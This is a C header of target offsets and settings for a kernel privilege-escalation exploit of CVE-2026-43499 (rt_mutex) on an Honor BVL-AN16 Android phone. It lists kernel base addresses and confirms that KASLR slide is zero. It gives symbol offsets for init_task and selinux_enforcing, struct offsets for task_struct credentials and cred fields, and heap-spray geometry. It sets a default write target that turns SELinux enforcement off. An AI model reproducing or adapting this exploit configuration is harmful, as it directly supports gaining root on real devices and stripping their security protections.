#pragma once
/* bvl_43499.h - BVL-AN16 CVE-2026-43499 (GhostLock / rt_mutex) config & offsets.
 *
 * ⚠ OFFSETS ARE VERIFIED, NOT GUESSED.
 *   Source: refs/cve-2026-43499-honor/exploit/exploit/src/targets/honor-BVL-AN16/
 *   target.h — generated from the BVL boot.img BTF/kallsyms. The same SoC build
 *   (6.1.157-android14-11, SM8735) is targeted, so these are authoritative for
 *   our BVL-AN16. KASLR slide == 0 is confirmed (KIMAGE_TEXT_BASE ==
 *   KERNEL_IMG_BASE == 0xffffffc008000000).
 *
 * Struct layouts (rt_mutex_base / rt_mutex_waiter / rb_node) are AOSP 6.1 stable
 * and were cross-checked against the AOSP common android14-6.1 source.
 */

/* ----------------------------------------------------------------------
 * Kernel image / direct-map window (slide == 0 confirmed)
 * -------------------------------------------------------------------- */
#define KERNEL_IMG_BASE       0xffffffc008000000ULL   /* == KIMAGE_TEXT_BASE */
#define P0_PAGE_OFFSET        0xffffff8000000000ULL
#define DIRECT_MAP_BASE       0xffffff8000000000ULL
#define DIRECT_MAP_END        0xffffff9000000000ULL
#define VMEMMAP_START         0xfffffffe00000000ULL

/* ----------------------------------------------------------------------
 * Key kernel symbols (image base + boot.img-derived offset)
 * -------------------------------------------------------------------- */
#define K_INIT_TASK_OFF          0x21e1780ULL
#define K_SELINUX_ENFORCING_OFF  0x2827fa8ULL
#define K_SECURITY_HOOK_HEADS_OFF 0x16d56f8ULL
#define K_KMALLOC_CACHES_OFF     0x16d5238ULL
#define K_ANON_PIPE_BUF_OPS_OFF  0x1163c58ULL

#define K_INIT_TASK            (KERNEL_IMG_BASE + K_INIT_TASK_OFF)
#define K_SELINUX_ENFORCING    (KERNEL_IMG_BASE + K_SELINUX_ENFORCING_OFF)
#define K_SECURITY_HOOK_HEADS  (KERNEL_IMG_BASE + K_SECURITY_HOOK_HEADS_OFF)
#define K_KMALLOC_CACHES       (KERNEL_IMG_BASE + K_KMALLOC_CACHES_OFF)
#define K_ANON_PIPE_BUF_OPS    (KERNEL_IMG_BASE + K_ANON_PIPE_BUF_OPS_OFF)

/* ----------------------------------------------------------------------
 * struct rt_mutex_base (6.1.177 verified, identical on BVL 6.1.157)
 *   wait_lock     @0x00  (raw_spinlock)
 *   waiters       @0x08  (struct rb_root_cached)
 *   waiters.rb_leftmost @0x10
 *   owner         @0x18
 * -------------------------------------------------------------------- */
#define OFF_RTMB_WAIT_LOCK    0x00
#define OFF_RTMB_WAITERS      0x08
#define OFF_RTMB_WAITERS_LM   0x10
#define OFF_RTMB_OWNER        0x18

/* ----------------------------------------------------------------------
 * struct rt_mutex_waiter (6.1, !DEBUG_RT_MUTEXES) — verified
 * -------------------------------------------------------------------- */
#define OFF_W_TREE_ENTRY      0x00   /* struct rb_node  (24 bytes) */
#define OFF_W_PI_TREE_ENTRY   0x18   /* struct rb_node */
#define OFF_W_TASK            0x30
#define OFF_W_LOCK            0x38
#define OFF_W_WAKE_STATE      0x40
#define OFF_W_PRIO            0x44

/* ----------------------------------------------------------------------
 * struct rb_node (3 pointers, 24 bytes)
 * -------------------------------------------------------------------- */
#define RB_NODE_SZ            0x18
#define RB_PARENT_COLOR_OFF   0x00   /* __rb_parent_color */
#define RB_EMPTY_NODE_BIT     0x2    /* RB_EMPTY_NODE flag in bit 1 */

/* ----------------------------------------------------------------------
 * task_struct (verified for BVL 6.1.157)
 * -------------------------------------------------------------------- */
#define OFF_TS_REAL_CRED      0x838
#define OFF_TS_CRED           0x840
#define OFF_TS_PI_LOCK        0x92c   /* raw_spinlock_t pi_lock */
#define OFF_TS_PI_BLOCKED_ON  0x958   /* struct rt_mutex_waiter *pi_blocked_on */
#define OFF_TS_SECCOMP        0x908
#define OFF_TS_TASKS          0x550
#define OFF_TS_PID            0x630
#define OFF_TS_TGID           0x634

/* ----------------------------------------------------------------------
 * struct cred
 * -------------------------------------------------------------------- */
#define OFF_CRED_UID          0x04
#define OFF_CRED_CAPS         0x28
#define OFF_CRED_SECURITY     0x78

/* ----------------------------------------------------------------------
 * pselect spray geometry (verified)
 *   PSELECT_WAITER_WORD_SHIFT = 11  (word index of the waiter's controlled
 *   field inside the sprayed fd_set canvas; see honor target.h)
 * -------------------------------------------------------------------- */
#define PSELECT_WAITER_WORD_SHIFT 11
/* Depth of stack we spray before the consumer allocates the waiter. The honor
 * reference computes this from the fdset word placement; 0x300 is a starting
 * point and MUST be re-measured on the BVL device during Phase-2 calibration. */
#ifndef BVL_SPRAY_DEPTH
#define BVL_SPRAY_DEPTH       0x300
#endif

/* Write target once the rb_erase primitive is won. Default: selinux.enforcing. */
#ifndef BVL_WRITE_TARGET
#define BVL_WRITE_TARGET      K_SELINUX_ENFORCING   /* patch selinux_state.enforcing=0 */
#endif
